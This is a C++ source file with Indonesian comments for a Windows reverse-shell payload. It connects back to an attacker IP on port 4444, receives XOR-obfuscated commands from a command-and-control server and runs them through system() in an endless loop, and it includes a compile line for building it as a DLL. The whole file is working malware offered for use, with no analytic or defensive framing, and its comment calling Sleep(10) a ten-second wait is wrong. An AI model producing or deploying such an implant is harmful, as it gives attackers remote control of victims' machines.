// Payload ini menggunakan koneksi TCP terbalik (reverse TCP connection) ke alamat IP penyerang dan mendengarkan perintah untuk dieksekusi pada mesin target.
// Payload ini menggunakan Winsock untuk membangun koneksi TCP antara mesin target dan mesin penyerang.
// Dalam loop tak terbatas, payload menerima perintah dari C2 (Command and Control) penyerang, mendekripsi perintah tersebut menggunakan enkripsi XOR, mengeksekusi perintah menggunakan `system`, dan kemudian menunggu 10 detik sebelum mengulangi proses ini.

// Kompilasi manual: x86_64-w64-mingw32-g++ -o payload.dll payload.cpp -lws2_32 -static-libgcc -static-libstdc++

#include <iostream>
#include <string>
#include <cstring>
#include <winsock2.h>
#include <ws2tcpip.h>

// Fungsi enkripsi XOR
std::string xorEncrypt(const std::string& data, const std::string& key) {
    // Menginisialisasi string untuk menyimpan hasil enkripsi
    std::string encrypted;
    // Melakukan operasi XOR untuk setiap karakter data menggunakan kunci
    for (size_t i = 0; i < data.size(); ++i) {
        encrypted += data[i] ^ key[i % key.size()]; // XOR dengan karakter dari kunci, melingkar jika panjang data > kunci
    }
    return encrypted;
}

int main() {
    // Alamat IP penyerang, ganti dengan alamat IP Anda
    std::string attackerIP = "192.168.1.1"; // Ganti dengan IP Anda
    int port = 4444; // Ganti dengan port yang akan digunakan
    std::string encryptionKey = "123456789"; // Ganti dengan kunci enkripsi XOR yang diinginkan

    // Inisialisasi Winsock
    WSADATA wsData;
    WORD version = MAKEWORD(2, 2);
    if (WSAStartup(version, &wsData) != 0) {
        std::cerr << "Error menginisialisasi Winsock.\n";
        return 1;
    }

    // Membuat socket TCP
    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == INVALID_SOCKET) {
        std::cerr << "Gagal membuat socket.\n";
        WSACleanup();
        return 1;
    }

    // Konfigurasi alamat server
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port); // Mengatur port dengan nilai yang telah ditentukan
    inet_pton(AF_INET, attackerIP.c_str(), &serverAddr.sin_addr); // Konversi alamat IP menjadi format yang sesuai

    // Mencoba menghubungkan ke server (mesin penyerang)
    if (connect(sockfd, (sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
        std::cerr << "Koneksi gagal.\n";
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    // Loop utama untuk menerima dan menjalankan perintah
    while (true) {
        std::string commands;
        char buffer[4096]; // Buffer untuk menyimpan data yang diterima
        int bytesReceived = recv(sockfd, buffer, sizeof(buffer), 0); // Menerima data dari server

        // Jika menerima data
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0'; // Menandai akhir string dalam buffer
            commands = buffer; // Menyimpan perintah yang diterima dalam variabel commands
        }

        // Mendekripsi perintah yang diterima menggunakan enkripsi XOR dengan kunci yang telah ditentukan
        std::string decryptedCommands = xorEncrypt(commands, encryptionKey);

        // Menjalankan perintah yang didekripsi pada mesin target menggunakan system
        system(decryptedCommands.c_str());

        // Menunggu 10 detik sebelum mengulangi proses
        Sleep(10);
    }

    // Menutup socket dan membersihkan penggunaan Winsock
    closesocket(sockfd);
    WSACleanup();

    return 0;
}
